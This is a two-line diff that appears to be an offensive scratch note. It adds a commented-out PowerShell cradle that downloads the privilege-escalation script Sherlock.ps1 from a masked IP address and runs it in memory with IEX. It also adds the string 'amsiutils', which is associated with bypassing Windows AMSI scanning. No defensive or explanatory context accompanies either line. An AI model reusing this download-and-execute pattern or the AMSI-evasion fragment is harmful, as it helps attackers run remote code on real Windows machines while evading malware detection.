@@ -1,0 +1,2 @@
+# (New-Object System.Net.WebClient).DownloadString('http://192.X.X.X/Sherlock.ps1') | IEX
+'amsiutils'
